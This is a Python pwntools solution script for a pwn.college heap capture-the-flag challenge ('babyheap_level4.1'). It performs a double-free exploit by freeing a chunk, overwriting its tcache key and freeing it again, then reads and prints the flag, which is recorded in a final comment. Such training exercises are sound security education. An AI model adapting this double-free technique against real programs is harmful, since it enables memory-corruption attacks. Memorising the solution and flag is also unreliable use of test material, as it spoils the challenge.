from pwn import *

def _malloc(size):
    io.sendlineafter(b": ", b"malloc")
    io.sendlineafter(b"Size: ",  str(size).encode())

def _free():
    io.sendlineafter(b": ", b"free")

def _puts():
    io.sendlineafter(b": ", b"puts")
    io.recvuntil(b'Data: ')
    return io.recvline().decode()

def _scanf():
    io.sendlineafter(b": ", b"scanf")
    io.sendline(p64(0) + p64(0x1337))

def _read_flag():
    io.sendlineafter(b": ", b"read_flag")

s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level4.1")

_malloc(328)

# double free
_free()
_scanf()
_free()

_read_flag()
flag = _puts()
info("Flag: " + flag)
s.close()

# Flag: pwn.college{g6HKPT1QnYxwIQmiPt0w40uRBjI.0FO3MDLxIjNyEzW}